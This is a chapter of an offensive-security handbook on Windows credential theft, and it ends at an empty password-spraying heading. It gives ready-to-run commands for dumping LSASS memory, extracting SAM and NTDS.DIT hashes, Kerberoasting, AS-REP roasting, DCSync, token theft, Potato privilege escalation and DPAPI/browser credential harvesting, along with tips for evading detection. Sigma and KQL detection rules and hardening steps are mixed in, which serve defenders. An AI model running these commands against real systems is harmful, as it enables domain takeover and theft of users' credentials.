# Domain 30 — C2 Frameworks, Credential Internals, and Offensive Infrastructure

## Chapter 30B — Credential Theft Mechanics and Identity Attack Chains

> **Scope:** LSASS memory architecture and credential storage internals · Mimikatz `sekurlsa` module mechanics — how logonpasswords parses LSASS structures · Credential dumping techniques — MiniDumpWriteDump, comsvcs.dll, NanoDump, PPL bypass, LSASS Shtinkering · SAM/SECURITY/SYSTEM hive extraction · Cached domain credentials (DCC2) · Kerberoasting — TGS request mechanics, RC4 vs AES ticket encryption, offline cracking, targeted Kerberoasting · AS-REP Roasting — pre-authentication bypass, account discovery, cracking methodology · DCSync — MS-DRSR replication protocol, DrsGetNCChanges, replication rights · NTDS.DIT offline extraction — Volume Shadow Copy, ntdsutil, secretsdump parsing · Token manipulation — impersonation levels, token theft, make/steal token operations · DPAPI master key extraction and credential decryption · Browser and application credential theft · SAML and OAuth token abuse — Golden SAML, PRT theft, OAuth consent grant attacks · Credential relay — NTLM relay internals, coercion techniques (PetitPotam, PrinterBug, DFSCoerce), Kerberos delegation abuse · Password spraying and brute-force · MFA bypass techniques · Cloud credential theft (AWS, Azure, GCP) · Post-exploitation credential hygiene and incident response · Detection engineering for each technique with specific telemetry requirements

---

## 1. LSASS Memory Architecture and Credential Storage

The Local Security Authority Subsystem Service (LSASS, `lsass.exe`) is the central credential management process in Windows. It authenticates users, generates access tokens, and — critically for attackers — caches credential material in its process memory. Understanding exactly what LSASS stores, and in what data structures, is essential for both offensive credential harvesting and defensive detection.

### 1.1 What LSASS Stores

LSASS hosts multiple Security Support Providers (SSPs), each of which handles a specific authentication protocol and maintains its own credential cache:

**Wdigest SSP** (`wdigest.dll`): Prior to Windows 8.1/Server 2012 R2, Wdigest stored plaintext passwords in LSASS memory. Microsoft disabled Wdigest plaintext caching by default with KB2871997, but it can be re-enabled by setting the registry key `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential` to `1`. When enabled, the Wdigest SSP stores credentials in a linked list of `KIWI_WDIGEST_LIST_ENTRY` structures (as named by Mimikatz), each containing the username, domain, and plaintext password. Even on modern systems, attackers who achieve SYSTEM privileges can re-enable Wdigest, wait for users to authenticate (or force re-authentication), and then harvest plaintext credentials.

**NTLM SSP** (`msv1_0.dll`): Stores NTLM hash pairs (LM hash and NT hash) for authenticated users. The NT hash is the MD4 hash of the user's Unicode password. Even without the plaintext password, the NT hash is directly usable for pass-the-hash attacks. The MSV1_0 SSP stores credentials in `KIWI_MSV1_0_LIST` structures containing the `LogonDomainName`, `UserName`, and `NtOwfPassword` (the NT hash) fields. The LM hash is stored in the `LmOwfPassword` field but is empty (`AAD3B435B51404EEAAD3B435B51404EE`) on modern systems where LM hashing is disabled.

**Kerberos SSP** (`kerberos.dll`): Caches Kerberos tickets (TGTs and service tickets) and, on systems where the Kerberos credential cache is populated, the user's plaintext password or AES encryption keys. The TGT can be extracted and used for pass-the-ticket attacks.

**TsPkg** (`tspkg.dll`): The Terminal Services Package SSP stores credentials for RDP sessions. Like Wdigest, TsPkg stored plaintext credentials in older Windows versions and can be re-enabled on modern systems.

**CredSSP** and **LiveSSP**: Additional SSPs that may cache credentials for specific authentication scenarios (Remote Desktop Protocol and Microsoft account authentication, respectively).

### 1.2 Credential Encryption in LSASS

The credentials stored in LSASS memory are encrypted using either 3DES (Triple DES) or AES-256, with encryption keys derived from session-specific data. The encryption key material is itself stored in LSASS memory, which is why dumping the full LSASS process memory provides everything needed to decrypt the cached credentials.

On Windows versions prior to Windows 10 1607, LSASS uses 3DES-CBC with a key derived from a combination of the LSA secret key and session-specific material. The initialization vector (IV) and the 3DES key are stored in adjacent structures within LSASS memory. Mimikatz's `sekurlsa` module locates these structures by searching for specific byte patterns (signatures) in the loaded SSP DLLs, then uses the found key material to decrypt each SSP's credential cache.

On Windows 10 1607 and later, LSASS switched to AES-256-CFB8 for credential encryption. The key and IV are stored in `KIWI_BCRYPT_HANDLE_KEY` and `KIWI_BCRYPT_KEY81` structures. Mimikatz maintains pattern signatures for each Windows version to locate these structures, which is why Mimikatz must be regularly updated to support new Windows builds — Microsoft periodically changes the offsets and structure layouts.

### 1.3 Credential Guard and Isolated LSA

Windows Credential Guard (introduced in Windows 10 Enterprise) moves credential operations into an isolated process (`LsaIso.exe`) running in a Virtual Secure Mode (VSM) enclave protected by the hypervisor. When Credential Guard is enabled, the Kerberos TGT and NTLM hash material are stored in the isolated LSA process rather than in the regular `lsass.exe` process. Even if an attacker dumps LSASS memory, they cannot extract the primary credential material because it exists in a hardware-isolated address space.

**Credential Guard limitations:** Does not protect Wdigest credentials (if re-enabled), cached logon credentials (DCC2), credentials stored by third-party SSPs, or credentials already in regular LSASS memory from earlier sessions. Does not prevent DCSync or credential theft via other means. See Domain 2 Chapter 2C §4 for hardware-backed isolation mechanisms.

**Enabling Credential Guard:**
```
# GPO
Computer Configuration → Policies → Administrative Templates →
  System → Device Guard → Turn on Virtualization Based Security
  → Credential Guard Configuration: Enabled with UEFI lock

# Registry (requires VBS-capable hardware)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\LSA" /v LsaCfgFlags /t REG_DWORD /d 1 /f
# 1 = Enabled with UEFI lock, 2 = Enabled without lock

# Verify
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard |
  Select-Object SecurityServicesRunning
# SecurityServicesRunning should include "1" (Credential Guard)
```

---

## 2. Credential Dumping Techniques

### 2.1 LSASS Dumping — Comprehensive Method Table

| Method | Tool | Requires | PPL-Safe? | Detection Difficulty |
|--------|------|----------|-----------|---------------------|
| In-memory parsing | Mimikatz `sekurlsa::logonpasswords` | SeDebugPrivilege | No | Low (well-signatured) |
| MiniDump to disk | `comsvcs.dll` MiniDump (LOLBin) | Admin + LSASS PID | No | Low |
| MiniDump to disk | `procdump.exe -ma lsass.exe` | Admin | No | Low |
| MiniDump to disk | Task Manager right-click | Admin (interactive) | No | Low |
| Direct syscall dump | NanoDump | SeDebugPrivilege | No | Medium |
| Fork-and-dump | NanoDump `/fork` | SeDebugPrivilege | No | Medium-High |
| Handle duplication | NanoDump `/dup` or HandleKatz | SeDebugPrivilege | No | High |
| SSP injection | AddSecurityPackage | Admin | Yes (runs inside LSASS) | Medium |
| WER abuse | LSASS Shtinkering | Admin | Yes (WER is trusted) | High |
| Kernel driver | mimidrv.sys, PPLdump, PPLmedic | Admin + driver load | Yes (bypasses PPL) | Medium |
| Silent Process Exit | Registry + WER config | Admin | Depends | High |
| Offline dump (memory image) | WinPmem, FTK Imager, DumpIt | Admin | N/A | Low |

**Exact commands for each method:**

```
# Method 1: Mimikatz in-memory
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords         # all credentials
mimikatz # sekurlsa::wdigest                # WDigest plaintext (if enabled)
mimikatz # sekurlsa::kerberos               # Kerberos tickets
mimikatz # sekurlsa::msv                    # NTLM hashes only
mimikatz # sekurlsa::ekeys                  # Kerberos encryption keys (AES, RC4)
mimikatz # sekurlsa::dpapi                  # DPAPI master keys
mimikatz # sekurlsa::credman                # Credential Manager entries
mimikatz # sekurlsa::tspkg                  # TsPkg (RDP) credentials

# Method 2: comsvcs.dll MiniDump (LOLBin)
tasklist /fi "imagename eq lsass.exe"
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\temp\l.dmp full
# Variant: ordinal to avoid string detection
rundll32.exe C:\Windows\System32\comsvcs.dll, #24 <PID> C:\temp\l.dmp full

# Method 3: ProcDump (signed by Microsoft)
procdump.exe -accepteula -ma lsass.exe C:\temp\lsass.dmp

# Method 4: NanoDump — direct syscalls, invalid signature
nanodump.exe --write C:\temp\lsass.dmp
nanodump.exe --fork --write C:\temp\lsass.dmp      # fork-and-dump
nanodump.exe --dup --write C:\temp\lsass.dmp        # handle duplication
nanodump.exe --malseclogon --write C:\temp\l.dmp    # MalSecLogon technique

# Method 5: HandleKatz — handle duplication via System handle cloning
HandleKatz.exe --pid:<LSASS_PID> --outfile:C:\temp\lsass.dmp

# Method 6: PPLdump — PPL bypass via BYOVD or exploit
PPLdump.exe <LSASS_PID> C:\temp\lsass.dmp

# Method 7: PPLmedic — PPL bypass via WSUS exploitation
PPLmedic.exe dump <LSASS_PID> C:\temp\lsass.dmp

# Method 8: SSP injection (runs inside PPL LSASS)
# Place malicious SSP DLL on disk
mimikatz # misc::memssp
# Or: AddSecurityPackage API call to load custom SSP
# Passwords logged to C:\Windows\System32\mimilsa.log

# Method 9: Silent Process Exit — trigger WER dump on LSASS termination
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\lsass.exe" /v GlobalFlag /t REG_DWORD /d 0x200 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe" /v ReportingMode /t REG_DWORD /d 2 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe" /v LocalDumpFolder /t REG_SZ /d "C:\temp" /f

# Offline parsing of any dump
mimikatz # sekurlsa::minidump C:\temp\lsass.dmp
mimikatz # sekurlsa::logonpasswords

# pypykatz (Python — Linux-based offline parsing)
pypykatz lsa minidump lsass.dmp
pypykatz lsa minidump lsass.dmp -o creds.txt
```

### 2.2 NanoDump Evasion Details

**Direct syscalls:** NanoDump uses inline assembly `syscall` instructions for `NtOpenProcess`, `NtReadVirtualMemory`, and related functions, bypassing EDR hooks on `ntdll.dll`.

**Fork-and-dump:** Uses `NtCreateProcessEx` to create a copy-on-write clone of LSASS with a different PID, then dumps the clone. Evades rules that monitor for reads against the LSASS PID.

**Handle duplication:** Enumerates system handles via `NtQuerySystemInformation(SystemHandleInformation)`, identifies a process with an existing LSASS handle (`csrss.exe`, antimalware services), and duplicates that handle via `NtDuplicateObject`. Avoids generating direct process access events.

**Invalid dump signature:** Overwrites the `MDMP` header magic bytes, preventing on-disk dump scanners from recognizing the output. The attacker fixes the signature before parsing.

### 2.3 LSASS Protection and Bypass

**RunAsPPL (Protected Process Light):**
```
# Enable (requires reboot)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f

# Enable with UEFI lock (prevents offline registry modification)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 2 /f

# Verify
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name RunAsPPL
```

**PPL bypass techniques:**
1. **BYOVD (Bring Your Own Vulnerable Driver):** Load a signed driver with a known arbitrary-read/write vulnerability, zero out the `EPROCESS.Protection` field on LSASS, downgrading it from PPL to unprotected. Common drivers: `RTCore64.sys` (CVE-2019-16098), `DBUtil_2_3.sys` (CVE-2021-21551), `gdrv.sys` (CVE-2018-19320).
2. **PPLdump:** Exploits the WER service's interaction with PPL processes.
3. **PPLmedic:** Exploits the Windows Update client's trusted SYSTEM-level access.
4. **mimidrv.sys:** Mimikatz's kernel driver component — requires loading an unsigned driver (blocked by HVCI/DSE).

**Detection (LSASS dumping):**

| Source | Event | Key Fields |
|--------|-------|------------|
| Sysmon Event ID 10 | ProcessAccess to lsass.exe | `TargetImage: lsass.exe`, `GrantedAccess: 0x1010, 0x1FFFFF, 0x1410, 0x143A` |
| Sysmon Event ID 1 | Process creation | `rundll32.exe` with `comsvcs.dll` or `procdump.exe` targeting LSASS |
| Sysmon Event ID 7 | Image loaded into lsass.exe | Unexpected DLL loaded into LSASS (SSP injection) |
| Security Event ID 4622 | Security package loaded | New SSP loaded by LSA |
| Security Event ID 4688 | Process creation | `procdump.exe`, `rundll32.exe`, `ntdsutil.exe` with suspicious args |
| Defender ASR | Block credential stealing | Rule GUID `9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2` |

Sigma rule (LSASS access):
```yaml
title: LSASS Memory Access for Credential Dumping
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    EventID: 10
    TargetImage|endswith: '\lsass.exe'
    GrantedAccess|contains:
      - '0x1FFFFF'
      - '0x1410'
      - '0x1010'
      - '0x143a'
  filter_legitimate:
    SourceImage|endswith:
      - '\MsMpEng.exe'
      - '\csrss.exe'
      - '\svchost.exe'
      - '\wininit.exe'
      - '\services.exe'
  condition: selection and not filter_legitimate
level: critical
```

Sigma rule (comsvcs.dll LOLBin):
```yaml
title: LSASS Dump via comsvcs.dll MiniDump
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    EventID: 1
    CommandLine|contains|all:
      - 'comsvcs'
      - 'MiniDump'
  selection_ordinal:
    EventID: 1
    CommandLine|contains|all:
      - 'comsvcs'
      - '#24'
  condition: selection or selection_ordinal
level: critical
```

KQL (Microsoft Sentinel):
```kql
SecurityEvent
| where EventID == 10
| where TargetImage endswith "\\lsass.exe"
| where GrantedAccess in ("0x1FFFFF", "0x1010", "0x1410", "0x143a")
| where SourceImage !endswith "\\MsMpEng.exe"
    and SourceImage !endswith "\\csrss.exe"
| project TimeGenerated, Computer, SourceImage, GrantedAccess, CallTrace
```

---

## 3. SAM, SECURITY, and SYSTEM Hive Extraction

The SAM (Security Accounts Manager) database contains local account password hashes. The SECURITY hive contains LSA secrets (service account passwords, cached domain credentials). The SYSTEM hive contains the boot key (SYSKEY) needed to decrypt both.

### 3.1 Extraction Methods

```
# Method 1: reg save (requires admin)
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
reg save HKLM\SECURITY C:\temp\SECURITY

# Method 2: Volume Shadow Copy
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY C:\temp\SECURITY

# Method 3: esentutl.exe (LOLBin — copies locked files)
esentutl.exe /y /vss C:\Windows\System32\config\SAM /d C:\temp\SAM

# Method 4: Mimikatz
mimikatz # lsadump::sam /system:C:\temp\SYSTEM /sam:C:\temp\SAM
mimikatz # lsadump::secrets /system:C:\temp\SYSTEM /security:C:\temp\SECURITY

# Method 5: Impacket secretsdump (remote — requires admin creds)
impacket-secretsdump domain.local/admin:Password1@target
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL

# Method 6: Netexec
nxc smb target -u admin -p Password1 --sam
nxc smb target -u admin -p Password1 --lsa
```

### 3.2 LSA Secrets

LSA secrets (`HKLM\SECURITY\Policy\Secrets`) store:
- Service account passwords (plaintext)
- DPAPI machine master key
- Cached domain credentials (DCC2/MSCACHEv2)
- Computer account password
- Auto-logon credentials (if configured)
- VPN/dial-up stored credentials

```
# Extract LSA secrets
mimikatz # lsadump::secrets
# Or
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
```

### 3.3 Cached Domain Credentials (DCC2 / MSCACHEv2)

Windows caches the last N domain logon credentials (default: 10, configurable via `CachedLogonsCount`) for offline logon when a DC is unreachable. These are stored as MSCACHEv2 (aka DCC2) hashes in the SECURITY hive.

DCC2 hashes use PBKDF2 with 10,240 iterations, making them significantly slower to crack than NTLM hashes.

```
# Extract cached creds
mimikatz # lsadump::cache
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
# Output: $DCC2$10240#username#hash

# Crack with hashcat (mode 2100 — very slow)
hashcat -m 2100 dcc2_hashes.txt wordlist.txt

# Reduce cached logons (hardening)
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" \
  /v CachedLogonsCount /t REG_SZ /d 0 /f
# Note: setting to 0 means users cannot log in when DC is unreachable
```

**Detection:**

Sigma rule:
```yaml
title: SAM/SECURITY Hive Extraction via reg.exe
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    EventID: 1
    CommandLine|contains|all:
      - 'reg'
      - 'save'
    CommandLine|contains:
      - 'HKLM\\SAM'
      - 'HKLM\\SYSTEM'
      - 'HKLM\\SECURITY'
      - 'hklm\\sam'
      - 'hklm\\system'
      - 'hklm\\security'
  condition: selection
level: critical
```

---

## 4. Mimikatz Internals: How sekurlsa::logonpasswords Works

### 4.1 The Parsing Process

When an operator runs `sekurlsa::logonpasswords`, Mimikatz executes the following sequence:

**Step 1 — Acquire LSASS access:** Opens a handle to LSASS with `PROCESS_VM_READ | PROCESS_QUERY_INFORMATION`. Alternatively, operates against a dump file via `sekurlsa::minidump`.

**Step 2 — Locate encryption keys:** Scans memory regions of loaded SSP DLLs (`lsasrv.dll`, `wdigest.dll`, `kerberos.dll`, `msv1_0.dll`, `tspkg.dll`) for hardcoded byte patterns (signatures) that differ between Windows builds. When a signature matches, reads relative offsets to locate the AES key, IV, and 3DES key structures.

**Step 3 — Enumerate logon sessions:** Reads the `LogonSessionList` structure in `lsasrv.dll`. Each logon session entry contains LUID, username, domain, logon type, logon time, and SID — linked in a doubly-linked list.

**Step 4 — Extract and decrypt credentials per SSP:** For each logon session, locates the corresponding credential entry in each SSP's cache, reads the encrypted material, and decrypts it using the keys from Step 2.

**Step 5 — Format and display:** Outputs credentials grouped by logon session.

### 4.2 Key Mimikatz Modules

| Module | Purpose | Usage |
|--------|---------|-------|
| `sekurlsa::logonpasswords` | All credentials from all SSPs | Primary credential harvest |
| `sekurlsa::ekeys` | Kerberos encryption keys (AES-256, AES-128, RC4) | Overpass-the-hash |
| `sekurlsa::dpapi` | DPAPI master keys cached in LSASS | DPAPI data decryption |
| `sekurlsa::wdigest` | WDigest plaintext passwords | Legacy/re-enabled WDigest |
| `sekurlsa::credman` | Credential Manager entries | Saved creds (RDP, web) |
| `lsadump::sam` | Local SAM hashes | Local account PtH |
| `lsadump::secrets` | LSA secrets | Service account passwords |
| `lsadump::cache` | Cached domain creds (DCC2) | Offline cracking |
| `lsadump::dcsync` | DCSync replication | Domain-wide hash extraction |
| `lsadump::backupkeys` | Domain DPAPI backup key | Decrypt any user's DPAPI data |
| `kerberos::golden` | Golden Ticket creation | Domain persistence (requires krbtgt hash) |
| `kerberos::silver` | Silver Ticket creation | Service-specific persistence |
| `dpapi::masterkey` | Decrypt DPAPI master key | With user password or domain backup key |
| `dpapi::chrome` | Chrome saved passwords | Browser credential theft |
| `misc::memssp` | Inject malicious SSP into LSASS | Plaintext credential logging |

### 4.3 Mimikatz Detection

**Binary signatures:** YARA rules and AV databases. Bypassed via in-memory execution (PowerShell `Invoke-Mimikatz`, BOF via C2), obfuscation, or custom compilation.

**Behavioral detection:** The distinctive API call pattern: `OpenProcess` → multiple `ReadProcessMemory` → pattern matching → targeted reads. Some EDR products detect this sequence.

**Post-compromise indicators:** Event ID 4624 Type 9 (NewCredentials) for PtH using harvested credentials. Event ID 4672 (Special privileges assigned) showing `SeDebugPrivilege` usage.

---

## 5. Kerberos Credential Attacks

### 5.1 Kerberoasting

Any authenticated domain user can request a TGS for any SPN. The TGS encrypted portion uses the service account's long-term key, crackable offline.

**Cracking performance comparison:**

| Etype | hashcat Mode | Throughput (RTX 4090) | Time for 8-char password |
|-------|-------------|----------------------|--------------------------|
| RC4-HMAC (etype 23) | 13100 | ~700 GH/s | Seconds |
| AES-256 (etype 18) | 19700 | ~150 kH/s | Days-weeks |

**Enumeration and exploitation:**
```
# Enumerate roastable accounts
impacket-GetUserSPNs domain.local/user:pass -dc-ip 10.0.0.1
Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname,pwdlastset,memberof

# Request all tickets
impacket-GetUserSPNs domain.local/user:pass -dc-ip 10.0.0.1 -request -outputfile tgs.hashes
Rubeus.exe kerberoast /outfile:tgs.hashes /format:hashcat

# Request RC4 (downgrade) even when AES is supported
Rubeus.exe kerberoast /tgtdeleg /outfile:tgs_rc4.hashes

# Targeted Kerberoasting (set SPN on arbitrary user with GenericWrite)
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/svc'}
Rubeus.exe kerberoast /user:targetuser
Set-DomainObject -Identity targetuser -Clear serviceprincipalname

# Crack
hashcat -m 13100 tgs.hashes wordlist.txt -r rules/best64.rule
hashcat -m 19700 tgs.hashes wordlist.txt -r rules/best64.rule
```

**Detection:**
```yaml
title: Kerberoasting — Multiple TGS Requests with RC4 Encryption
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4769
    TicketEncryptionType: '0x17'
  filter_machine:
    ServiceName|endswith: '$'
  condition: selection and not filter_machine | count(ServiceName) by IpAddress > 3 within 5m
level: high
```

### 5.2 AS-REP Roasting

Targets accounts with `DONT_REQUIRE_PREAUTH` (UAC bit 0x400000). Any user can request an AS-REP without proving knowledge of the password.

```
# Enumerate and exploit
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass -dc-ip 10.0.0.1
impacket-GetNPUsers domain.local/user:pass -request -dc-ip 10.0.0.1 -format hashcat
Rubeus.exe asreproast /format:hashcat /outfile:asrep.hashes

# Crack (hashcat mode 18200)
hashcat -m 18200 asrep.hashes wordlist.txt -r rules/best64.rule
```

**Detection:** Event ID 4768 with `PreAuthType: 0` from non-machine accounts. See Domain 14 Chapter 14A §1.1 for comprehensive Sigma rules.

---

## 6. DCSync and Domain Credential Extraction

### 6.1 DCSync Attack

Requires `DS-Replication-Get-Changes` (GUID `1131f6aa-...`) + `DS-Replication-Get-Changes-All` (GUID `1131f6ad-...`) on the domain root. The attacker calls `DRSGetNCChanges` via DRSUAPI, replicating any account's secrets without DC access.

```
# Mimikatz — single account
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator

# Mimikatz — all accounts
mimikatz # lsadump::dcsync /domain:domain.local /all /csv

# Impacket secretsdump — remote DCSync
impacket-secretsdump domain.local/dauser:Password1@dc01.domain.local -just-dc
impacket-secretsdump domain.local/dauser:Password1@dc01.domain.local -just-dc-user krbtgt

# Netexec
nxc smb dc01.domain.local -u dauser -p Password1 --ntds

# Key targets
# krbtgt          → Golden Ticket
# Administrator   → Domain Admin
# AZUREADSSOACC$  → Azure AD SSO ticket forging
# DC machine acct → Silver Ticket to DC
```

**Detection:**
```yaml
title: DCSync — Replication from Non-DC Source
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4662
    Properties|contains:
      - '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'
      - '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'
  filter_dc:
    SubjectUserName|endswith: '$'
    SubjectUserName|startswith:
      - 'DC01'
      - 'DC02'
  condition: selection and not filter_dc
level: critical
```

KQL:
```kql
SecurityEvent
| where EventID == 4662
| where Properties contains "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"
| where SubjectUserName !endswith "$" or
    (SubjectUserName endswith "$" and SubjectUserName !in ("DC01$","DC02$"))
| project TimeGenerated, SubjectUserName, SubjectDomainName, ObjectName
```

### 6.2 NTDS.DIT Offline Extraction

```
# Volume Shadow Copy
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM

# diskshadow (scriptable, less monitored)
diskshadow /s shadow_script.txt

# ntdsutil IFM
ntdsutil "activate instance ntds" "ifm" "create full C:\temp\ifm" quit quit

# Offline parsing
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

# DSInternals (PowerShell)
$key = Get-BootKey -SystemHiveFilePath .\SYSTEM
Get-ADDBAccount -All -DBPath .\ntds.dit -BootKey $key |
  Format-Custom -View HashcatNT | Out-File hashes.txt
```

**Detection:**
```yaml
title: NTDS.DIT Extraction via Shadow Copy or ntdsutil
logsource:
  product: windows
  service: sysmon
detection:
  selection_vss:
    EventID: 1
    NewProcessName|endswith: '\vssadmin.exe'
    CommandLine|contains: 'shadow'
  selection_ntdsutil:
    EventID: 1
    NewProcessName|endswith: '\ntdsutil.exe'
    CommandLine|contains: 'ifm'
  selection_diskshadow:
    EventID: 1
    NewProcessName|endswith: '\diskshadow.exe'
  condition: selection_vss or selection_ntdsutil or selection_diskshadow
level: critical
```

---

## 7. Token Manipulation and Impersonation

### 7.1 Token Theft in Practice

```
# Mimikatz
mimikatz # privilege::debug
mimikatz # token::elevate          # elevate to SYSTEM
mimikatz # token::elevate /domainadmin  # impersonate a DA token
mimikatz # token::list             # list available tokens
mimikatz # token::revert           # revert to original token

# Incognito (standalone or Meterpreter)
meterpreter > use incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token "DOMAIN\\Administrator"

# Cobalt Strike
beacon> steal_token <PID>
beacon> make_token DOMAIN\user password
beacon> rev2self
beacon> getuid

# Windows API (C pseudocode)
hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, target_pid);
OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken);
DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL,
  SecurityImpersonation, TokenImpersonation, &hDupToken);
ImpersonateLoggedOnUser(hDupToken);
// Or: create a new process with the stolen token
DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL,
  SecurityImpersonation, TokenPrimary, &hPrimaryToken);
CreateProcessWithTokenW(hPrimaryToken, 0, L"cmd.exe", ...);
```

### 7.2 Potato-Family Privilege Escalation

All Potato attacks exploit `SeImpersonatePrivilege` by coercing a SYSTEM-level service to authenticate via a named pipe, then impersonating the SYSTEM token.

| Tool | Technique | Requires | Windows Version |
|------|-----------|----------|----------------|
| JuicyPotatoNG | DCOM activation on controlled port | `SeImpersonatePrivilege` | Win10/2019+ |
| PrintSpoofer | Print Spooler named pipe impersonation | `SeImpersonatePrivilege` | All |
| GodPotato | DCOM via RPCSS named pipe | `SeImpersonatePrivilege` | All |
| EfsPotato | EFS named pipe coercion | `SeImpersonatePrivilege` | All |
| SweetPotato | Combined (WinRM, Spooler, DCOM) | `SeImpersonatePrivilege` | All |
| RoguePotato | Remote DCOM activation + OXID resolver | `SeImpersonatePrivilege` | All |

```
# PrintSpoofer
PrintSpoofer.exe -i -c "cmd.exe"

# GodPotato
GodPotato.exe -cmd "cmd /c whoami"

# JuicyPotatoNG
JuicyPotatoNG.exe -t * -p "cmd.exe" -a "/c whoami"

# EfsPotato
EfsPotato.exe "whoami"

# SweetPotato
SweetPotato.exe -a "/c whoami" -e EfsRpc
```

### 7.3 SeBackupPrivilege Exploitation

```
# Read any file (bypass ACLs)
robocopy /b C:\Windows\System32\config C:\temp SAM SYSTEM SECURITY
# Or via backup API semantics in PowerShell (FILE_FLAG_BACKUP_SEMANTICS)

# On DC — read ntds.dit
robocopy /b C:\Windows\NTDS C:\temp ntds.dit

# Extract hashes offline
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
```

**Detection:** Event ID 4674 (privileged service called) with `SeBackupPrivilege`. Event ID 4663 (file access) with backup flag on SAM/SYSTEM/ntds.dit.

---

## 8. DPAPI Credential Extraction

### 8.1 DPAPI Architecture

Each user has master keys in `%APPDATA%\Microsoft\Protect\{SID}\`. Domain backup key allows domain admins to decrypt any domain user's master keys.

### 8.2 Extraction Methods

```
# SharpDPAPI — triage all DPAPI-protected data
SharpDPAPI.exe triage
SharpDPAPI.exe credentials      # Credential Manager blobs
SharpDPAPI.exe vaults            # Vault credentials
SharpDPAPI.exe rdg               # RDCMan saved passwords
SharpDPAPI.exe keepass           # KeePass config
SharpDPAPI.exe masterkeys        # master key files

# SharpDPAPI with domain backup key (domain-wide decryption)
SharpDPAPI.exe masterkeys /pvk:domain_backup.pvk
SharpDPAPI.exe credentials /pvk:domain_backup.pvk

# Extract domain DPAPI backup key
mimikatz # lsadump::backupkeys /system:dc01.domain.local /export
# Produces domain_backup.pvk — decrypt ANY domain user's DPAPI data

# Mimikatz DPAPI module
mimikatz # dpapi::masterkey /in:"C:\Users\target\AppData\Roaming\Microsoft\Protect\{SID}\{GUID}" /password:UserPassword
mimikatz # dpapi::cred /in:"C:\Users\target\AppData\Local\Microsoft\Credentials\{GUID}" /masterkey:<decrypted_mk>

# Chrome/Edge saved passwords
SharpChromium.exe logins
SharpChromium.exe cookies
SharpChromium.exe history
# Or
mimikatz # dpapi::chrome /in:"C:\Users\target\AppData\Local\Google\Chrome\User Data\Default\Login Data" /masterkey:<mk>

# SharpWeb — multi-browser credential extraction
SharpWeb.exe all
```

### 8.3 Browser and Application Credential Theft

```
# LaZagne — multi-application credential harvester
lazagne.exe all             # All modules
lazagne.exe browsers        # Browser saved passwords
lazagne.exe windows         # Windows credentials
lazagne.exe sysadmin        # Sysadmin tools (PuTTY, WinSCP, etc.)
lazagne.exe databases       # Database credentials
lazagne.exe wifi            # WiFi passwords

# Seatbelt — comprehensive host enumeration (includes creds)
Seatbelt.exe -group=user    # User-context data
Seatbelt.exe CredEnum       # Credential Manager
Seatbelt.exe CloudCredentials  # AWS/Azure/GCP creds
Seatbelt.exe PuttyHostKeys  # PuTTY saved sessions
Seatbelt.exe RDPSavedConnections
Seatbelt.exe WindowsVault

# WiFi passwords (plaintext — requires admin)
netsh wlan show profiles
netsh wlan show profile name="SSID" key=clear

# Windows Credential Manager
cmdkey /list
rundll32.exe keymgr.dll, KRShowKeyMgr
```

**Detection:**

| Source | Signal | Details |
|--------|--------|---------|
| Sysmon Event ID 11 | File creation in `\Microsoft\Credentials\` | Unusual process accessing Credential Manager blobs |
| Sysmon Event ID 1 | Process creation | LaZagne, SharpDPAPI, SharpChromium execution |
| Security Event ID 4662 | DS object access | MS-BKRP protocol for domain backup key extraction |
| File access | `Login Data`, `Cookies` (Chrome paths) | Non-browser process reading browser credential files |

---

## 9. Password Spraying and Brute Force

